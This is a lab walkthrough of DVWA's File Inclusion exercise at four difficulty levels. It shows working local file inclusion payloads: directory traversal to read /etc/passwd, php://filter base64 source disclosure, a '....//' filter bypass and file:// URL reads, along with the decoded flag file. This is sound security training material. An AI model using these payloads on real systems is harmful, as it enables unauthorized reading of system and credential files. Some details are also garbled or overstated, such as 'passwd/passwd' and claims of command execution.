---
description: http://localhost/DVWA/vulnerabilities/fi
---

# File Inclusion

<details>

<summary>What is a File Inclusion?</summary>

A **file inclusion** attack is a type of security exploit that takes advantage of improper or unchecked input handling in web applications. The goal of such an attack is to include files on a server through the web browser. There are two main types of file inclusion attacks: Local File Inclusion (LFI) and Remote File Inclusion (RFI).

1. **Local File Inclusion (LFI):**
   * In an LFI attack, an attacker tries to include files that are already present on the target system. These files could be configuration files, system files, or any other sensitive information.
   * The attacker manipulates input parameters or user-controlled data in a way that the application includes a file from the local file system.
   * For example, if a web application includes a file based on user input without proper validation, an attacker might input a malicious path to include sensitive files.
2. **Remote File Inclusion (RFI):**
   * RFI is a more severe form of file inclusion attack where the attacker includes files from a remote server controlled by them.
   * The attacker injects a URL pointing to a file on a remote server into a parameter or input field, and the application fetches and includes the contents of that remote file.
   * This can lead to the execution of arbitrary code on the server, potentially allowing the attacker to take control of the system.

File inclusion vulnerabilities can occur due to poor input validation and lack of proper security measures in web applications. To prevent file inclusion attacks, developers should:

* Validate and sanitize user input.
* Avoid dynamically including files based on user input without proper validation.
* Implement proper access controls to restrict file access.
* Use secure coding practices and frameworks that handle user input securely.

Regular security assessments, code reviews, and penetration testing can help identify and mitigate file inclusion vulnerabilities in web applications.

</details>

{% hint style="info" %}
Using BurpSuite and the FoxyProxy extension is recommended.
{% endhint %}

## Low

We've a div containing three distinct hyperlinks, each triggering the display of various files within the web application upon activation. The exhibition of a specific file is accomplished through the utilization of the subsequent GET request.

<div align="left"><figure><img src="../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure></div>

<figure><img src="../.gitbook/assets/image (214).png" alt=""><figcaption><p>file1.pho</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption><p>file2.php</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (216).png" alt=""><figcaption><p>file3.php</p></figcaption></figure>

<div align="left"><figure><img src="../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure></div>

```http
GET /DVWA/vulnerabilities/fi/?page=file1.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/DVWA/vulnerabilities/fi/?page=include.php
Connection: close
Cookie: security=low; PHPSESSID=s7nq882ng75b21h8b8uc4rmaod
Upgrade-Insecure-Requests: 1
```

This is php code of this level:

<figure><img src="../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>

The concept involves manipulating the filename within the page parameter to any desired file on the target, enabling us to retrieve its contents. By employing the following GET request, we can read the contents of the etc password file.

#### 1st Payload

```url
http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

Replacing this path: `../../../../../../etc/passwd` at file1.php, we obtain result of command in html output:

<figure><img src="../.gitbook/assets/image (54) (1).png" alt=""><figcaption></figcaption></figure>

If the goal is to disclose certain PHP code, one approach is to utilize PHP filters to encode the PHP code into base64.

#### 2nd Payload

```url
http://localhost/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
```

but the request is to see `fi.php` file, then we use this URL:

```
http://evil/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/hackable/flags/fi.php
```

which gives us the following base64 payload

```bash
PD9waHAKCmlmKCAhZGVmaW5lZCggJ0RWV0FfV0VCX1BBR0VfVE9fUk9PVCcgKSApIHsKCWV4aXQgKCJOaWNlIHRyeSA7LSkuIFVzZSB0aGUgZmlsZSBpbmNsdWRlIG5leHQgdGltZSEiKTsKfQoKPz4KCjEuKSBCb25kLiBKYW1lcyBCb25kCgo8P3BocAoKZWNobyAiMi4pIE15IG5hbWUgaXMgU2hlcmxvY2sgSG9sbWVzLiBJdCBpcyBteSBidXNpbmVzcyB0byBrbm93IHdoYXQgb3RoZXIgcGVvcGxlIGRvbid0IGtub3cuXG5cbjxiciAvPjxiciAvPlxuIjsKCiRsaW5lMyA9ICIzLikgUm9tZW8sIFJvbWVvISBXaGVyZWZvcmUgYXJ0IHRob3UgUm9tZW8
```

Decoding it, we obtain this php code:

```php
<?php

if( !defined( 'DVWA_WEB_PAGE_TO_ROOT' ) ) {
	exit ("Nice try ;-). Use the file include next time!");
}

?>

1.) Bond. James Bond

<?php

echo "2.) My name is Sherlock Holmes. It is my business to know what other people don't know.\n\n<br /><br />\n";

$line3 = "3.) Romeo, Romeo! Wherefore art thou Romeo?";
$line3 = "--LINE HIDDEN ;)--";
echo $line3 . "\n\n<br /><br />\n";

$line4 = "NC4pI" . "FRoZSBwb29s" . "IG9uIH" . "RoZSByb29mIG1" . "1c3QgaGF" . "2ZSBh" . "IGxlY" . "Wsu";
echo base64_decode( $line4 );

?>

<!-- 5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons. -->
```

{% hint style="warning" %}
The input is not sanitized, so I can execute any (potentially malicious) command.
{% endhint %}

## Medium

<figure><img src="../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

In this case, code includes a little validation checks:

`$file = str_replace( array( "http://", "https://" ), "", $file );`\
`$file = str_replace( array( "../", "..\\" ), "", $file );`

it tries to remove all sorts of http and https protocol usage, trying to remove the possibility for a Remote File Inclusion (RFI), and it also replaces `../` with the empty string: `""`.

The handling of the '../' character sequence is insufficient, as the validation is not performed recursively.

#### 1st Payload

```bash
....//....//....//....//....//etc/passwd
```

After input validation (not recursive), changing ../ to "", we obtain this result:

```
../../../../../etc/passwd
```

Then full URL will be this:

```
http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//etc/passwd/passwd
```

\
How the low level, adding the php filters we can also leak the server’s php code:

```
http://localhost/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//var/www/html/hackable/flags/fi.php
```

and we get the following base64

```
PD9waHAKCmlmKCAhZGVmaW5lZCggJ0RWV0FfV0VCX1BBR0VfVE9fUk9PVCcgKSApIHsKCWV4aXQgKCJOaWNlIHRyeSA7LSkuIFVzZSB0aGUgZmlsZSBpbmNsdWRlIG5leHQgdGltZSEiKTsKfQoKPz4KCjEuKSBCb25kLiBKYW1lcyBCb25kCgo8P3BocAoKZWNobyAiMi4pIE15IG5hbWUgaXMgU2hlcmxvY2sgSG9sbWVzLiBJdCBpcyBteSBidXNpbmVzcyB0byBrbm93IHdoYXQgb3RoZXIgcGVvcGxlIGRvbid0IGtub3cuXG5cbjxiciAvPjxiciAvPlxuIjsKCiRsaW5lMyA9ICIzLikgUm9tZW8sIFJvbWVvISBXaGVyZWZvcmUgYXJ0IHRob3UgUm9tZW8
```

To get an RFI instead we can use `php streams`.

{% hint style="warning" %}
The input is not sanitized sufficiently , so I can execute any (potentially malicious) command.
{% endhint %}

## High

<div align="left"><figure><img src="../.gitbook/assets/image (55) (1).png" alt=""><figcaption></figcaption></figure></div>

In this code the're two validation checks:

1. The `fnmatch()` function in PHP, which matches strings against patterns using shell-style wildcards. In our scenario, it matches any file that begins with 'file.'
2. The condition `$file != 'include.php'` introduces a specific case where the 'if' statement fails only when the file doesn't start with 'file' and is precisely 'include.php'.

#### 1st Payload

Regarding LFI exploitation, the code solely verifies whether the parameter begins with 'file' and does not examine its ending. Consequently, we can employ the following GET request to expose the 'passwd' file.

```
http://localhost/DVWA/vulnerabilities/fi/?page=file/../../../../../../../etc/passwd
```

however we cannot seem to able to use the php filters to leak php code by using the base64 converter.

#### 2nd Payload

An alternative approach involves leveraging the file protocol to access and read any file in the system based on its given path.

```html
http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
http://localhost/DVWA/vulnerabilities/fi/?page=file:///var/www/html/hackable/flags/fi.php
```

{% hint style="warning" %}
The input is not sanitized sufficiently , so I can execute any (potentially malicious) command.
{% endhint %}

## Impossible

<figure><img src="../.gitbook/assets/image (56) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Site isn't vulnerable to File Inclusion attack because the request includes only possible lecit value/page.
{% endhint %}

## References

For the making of this solution the following resource were used:

* [https://github.com/LeonardoE95/DVWA/tree/main/src/file\_inclusion](https://github.com/LeonardoE95/DVWA/tree/main/src/file_inclusion)
